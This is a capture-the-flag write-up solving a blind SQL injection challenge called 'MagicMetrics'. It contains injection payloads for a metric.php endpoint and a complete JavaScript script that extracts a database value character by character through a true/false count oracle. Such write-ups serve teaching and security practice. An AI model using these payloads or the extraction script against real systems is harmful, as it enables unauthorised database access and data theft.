# MagicMetrics

This challenge is a classic Blind SQLi. Poking around the website, I noticed a `metric.php` endpoint that takes a few parameters:

```
metric.php?metric=flags&type=count
```

The interesting part is that the parameters seem to go directly into the query (which screams SQL injection).

## First Attempt
My first instinct was to inject through the `column` parameter using `UNION SELECT` with a `CASE WHEN` to check characters one by one:

```
metric.php?metric=flags&type=count&column=*) UnIoN SeLeCt CASE WHEN substr((SELECT flag FROM flags LIMIT 1),1,1)='f' THEN 1 ELSE 0 END--
```

I tested a few characters manually in the browser console and they all came back `{"value":1}`. At first I thought the flag just started with those characters, but then _every single character_ returned 1. That's when it hit me — the `UNION SELECT` always adds a row to the result, so the count is always at least 1 no matter what. This approach is fundamentally broken.

## The Actual Injection Point
That left me fumbling for a bit. I needed to find a way to get a real true/false difference in the response. I wrote a quick debug script to test multiple injection strategies at once:

```javascript
// Baseline
fetch('metric.php?metric=flags&type=count&column=*')
  .then(r => r.text()).then(t => console.log('Baseline:', t));

// Injecting into column param — TRUE case (flag starts with F)
fetch(`metric.php?metric=flags&type=count&column=*) FROM flags WHERE substr(flag,1,1)='F'-- -`)
  .then(r => r.text()).then(t => console.log('TRUE (F):', t));

// Injecting into column param — FALSE case
fetch(`metric.php?metric=flags&type=count&column=*) FROM flags WHERE substr(flag,1,1)='9'-- -`)
  .then(r => r.text()).then(t => console.log('FALSE (9):', t));

// Injecting into metric param — TRUE case
fetch(`metric.php?metric=flags WHERE substr(flag,1,1)='F'-- -&type=count&column=*`)
  .then(r => r.text()).then(t => console.log('metric inject TRUE:', t));

// Injecting into metric param — FALSE case
fetch(`metric.php?metric=flags WHERE substr(flag,1,1)='9'-- -&type=count&column=*`)
  .then(r => r.text()).then(t => console.log('metric inject FALSE:', t));
```

So the `metric` parameter is where the table name goes. When we inject a `WHERE` clause there, we're turning the query into:

```sql
SELECT count(*) FROM flags WHERE substr(flag,1,1)='F'
```

And now the count genuinely returns 0 or 1 depending on whether the character matches. That's our boolean oracle.

## Final Solution
Now with a working oracle, writing the extraction script was the easy part:

```javascript
(async () => {
  const charset = 'FLAGBCDEGHIJKMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz{}_-!@#';
  let flag = '';

  for (let pos = 1; pos <= 100; pos++) {
    let found = false;
    for (const c of charset) {
      const url = `metric.php?metric=flags WHERE substr(flag,${pos},1)='${c}'-- -&type=count&column=*`;
      const res = await fetch(url).then(r => r.json());

      if (res.value === 1) {
        flag += c;
        console.log(`[${pos}] '${c}' -> ${flag}`);
        found = true;
        break;
      }
    }
    if (!found) { console.log('Done:', flag); break; }
    if (flag.endsWith('}')) { console.log('Flag:', flag); break; }
  }
})();
```

I reordered the charset to start with `FLAG{` since we know the format, just to make it resolve the prefix faster. Pasted this into the browser console and watched it go character by character. The whole thing took under a minute.

And so I found the flag: `FLAG{I_CAN_D0_TH1S_BLINDF0LD3D}`

----------------------

I hope this helps, have a great day :)
